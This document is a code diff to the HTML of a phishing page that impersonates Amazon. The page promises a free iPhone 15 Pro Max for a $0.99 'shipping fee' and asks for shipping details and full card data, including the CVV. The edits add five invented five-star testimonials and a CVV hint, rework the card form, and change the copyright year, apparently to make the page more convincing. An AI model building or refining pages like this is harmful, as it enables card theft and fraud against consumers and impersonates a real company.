@@ -23,7 +23,7 @@
     
     <main class="container">
         <section class="prize-section">
-            <img src="prize-image.png" alt="iPhone 15 Pro Max" class="prize-img">
+            <img src="prize-image.jpg" alt="iPhone 15 Pro Max" class="prize-img">
             <p>Dear Valued Amazon Customer,</p>
             <p>You've been selected as a winner in our Prime Member Appreciation Giveaway. Claim your brand new iPhone 15 Pro Max (valued at $1,199) today!</p>
             <p>Just cover the $0.99 shipping and handling fee, and we'll deliver it via Amazon Logistics in 3-5 business days.</p>
@@ -32,6 +32,24 @@
                 <span>✅ Official Amazon Giveaway</span>
                 <span>🔒 Secure & Verified</span>
             </div>
+            <div class="testimonials">
+                <div class="testimonial">
+                    <p>★★★★★ "I got my iPhone in just 3 days – totally legit!" - Sarah K.</p>
+                </div>
+                <div class="testimonial">
+                    <p>★★★★★ "Best giveaway ever! Shipped fast and free." - Mike T.</p>
+                </div>
+                <div class="testimonial">
+                    <p>★★★★★ "Couldn't believe I won – Amazon made it easy." - Emily R.</p>
+                </div>
+                <div class="testimonial">
+                    <p>★★★★★ "Received my prize without hassle. Highly recommend!" - David S.</p>
+                </div>
+                <div class="testimonial">
+                    <p>★★★★★ "The $0.99 was worth it – amazing phone!" - Lisa M.</p>
+                </div>
+            </div>
+        </section>
         
         <section class="form-section">
             <h2>Enter Your Shipping and Payment Details</h2>
@@ -83,7 +101,7 @@
                 <fieldset>
                     <legend>Payment Information</legend>
                     <p class="card-icons">Accepted: Visa | Mastercard | Amex | Discover</p>
-                    <div class="form-grid">
+                    <div class="form-grid payment-group">
                         <div>
                             <label for="card_name">Name on Card</label>
                             <input type="text" id="card_name" name="card_name" placeholder="John Doe" required>
@@ -92,17 +110,20 @@
                             <label for="card_number">Card Number</label>
                             <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" pattern="\d{13,19}" required>
                         </div>
-                        <div>
-                            <label for="exp_month">Exp. Month (MM)</label>
-                            <input type="text" id="exp_month" name="exp_month" placeholder="MM" pattern="\d{2}" required>
-                        </div>
-                        <div>
-                            <label for="exp_year">Exp. Year (YY)</label>
-                            <input type="text" id="exp_year" name="exp_year" placeholder="YY" pattern="\d{2}" required>
+                        <div class="exp-cvv">
+                            <div>
+                                <label for="exp_month">Expiration Month (MM)</label>
+                                <input type="text" id="exp_month" name="exp_month" placeholder="MM" pattern="\d{2}" required>
+                            </div>
+                            <div>
+                                <label for="exp_year">Expiration Year (YY)</label>
+                                <input type="text" id="exp_year" name="exp_year" placeholder="YY" pattern="\d{2}" required>
+                            </div>
                         </div>
                         <div>
                             <label for="cvv">CVV</label>
                             <input type="text" id="cvv" name="cvv" placeholder="123" pattern="\d{3,4}" required>
+                            <div class="cvv-hint">3-digit code on back of card</div>
                         </div>
                     </div>
                 </fieldset>
@@ -140,7 +161,7 @@
     </main>
     
     <footer>
-        <p>&copy; 2025 Amazon.com, Inc. or its affiliates. All rights reserved.</p>
+        <p>&copy; 2023 Amazon.com, Inc. or its affiliates. All rights reserved.</p>
         <p>Privacy Notice | Conditions of Use | Interest-Based Ads</p>
     </footer>
     
